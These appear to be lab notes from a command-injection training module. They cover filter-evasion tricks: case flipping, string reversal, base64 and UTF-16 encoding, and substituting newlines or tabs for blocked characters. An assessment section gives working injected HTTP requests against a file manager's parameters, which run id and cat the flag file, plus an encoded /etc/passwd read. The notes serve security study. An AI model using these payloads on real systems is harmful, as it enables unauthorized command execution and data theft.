Make sure to always encode with a `ctrl+u`
```bash
WhOaMi
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
echo 'whoami' | rev or $(rev<<<'imaohw')

# Different encoding
echo -n 'cat /etc/passwd | grep 33' | base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
# You can do the previous <<< instead of | since those are blacklisted operators
echo -n whoami | iconv -f utf-8 -t utf-16le | base64
```

```powershell
# Same can be done Windows
# Who am I command
iex "$('imaohw'[-1..-20] -join '')"

# Base64 encoding
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))

# Decoding
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
```

# Exercise 1
Do the following command `find /usr/share/ | grep root | grep mysql | tail -n 1`

```bash
echo -n  "find /usr/share/ | grep root | grep mysql | tail -n 1" | base64
ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=

# Now decoding it into burp.
127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)

# Answer
/usr/share/mysql/debian_create_root_user.sql
```

# Assessment
If we try to move the file to into the directory it is in we get this error.
`Error while moving: mv: '/var/www/html/files/51459716.txt' and '/var/www/html/files/51459716.txt' are the same file`

#### Get Request
```bash
# Top line for the injection.
GET /index.php?to=&from=51459716.txt&finish=1&move=1 HTTP/1.1
Host: 154.57.164.73:31240
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://154.57.164.73:31240/index.php?to=&from=51459716.txt
Accept-Encoding: gzip, deflate, br
Cookie: filemanager=2v7ovsl7q3vllcikr6a37fr4oq
Connection: keep-alive


GET /index.php?to=%26who'a'mi&from=%26wh'o'ami&finish=1&move=1 HTTP/1.1

GET /index.php?to=%26c'a't%09${PATH:0:1}flag.txt&from=%26'i'd&finish=1&move=1 HTTP/1.1
```